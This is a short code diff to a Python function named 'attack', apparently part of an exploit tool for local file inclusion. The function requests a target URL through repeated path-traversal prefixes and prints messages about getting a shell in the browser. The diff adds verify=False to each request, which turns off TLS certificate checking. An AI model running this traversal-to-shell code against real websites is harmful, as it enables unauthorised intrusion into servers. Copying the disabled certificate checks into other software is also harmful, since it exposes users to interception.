@@ -82,13 +82,13 @@ def attack(target, location, cookies=None, headers=None, payload=None, traverse=
     url = target+location
     print(colors("[~] Testing: {}".format(url), 93))
     try:
-        response = requests.get(url, headers=headers, cookies=cookies)
+        response = requests.get(url, headers=headers, cookies=cookies, verify=False)
 
         if response.status_code != 200:
             print(colors("[!] Unexpected HTTP Response ", 91))
             sys.exit(1)
         if not relative:
-            r = requests.get(url)
+            r = requests.get(url, verify=False)
             print(colors("[!] Try Refreshing Your Browser If You Haven't Gotten A Shell ", 91))
             if r.status_code != 200:
                 print(colors("[!] Unexpected HTTP Response ", 91))
@@ -97,7 +97,7 @@ def attack(target, location, cookies=None, headers=None, payload=None, traverse=
             for traversal in PATH_TRAVERSAL:
                 for i in range(10):
                     lfi = target + traversal * i + location
-                    r = requests.get(lfi, headers=headers, cookies=cookies)
+                    r = requests.get(lfi, headers=headers, cookies=cookies, verify=False)
                     if r.status_code != 200:
                         print(colors("[!] Unexpected HTTP Response ", 91))
             print(colors("[!] Try Refreshing Your Browser If You Haven't Gotten A Shell ", 91))
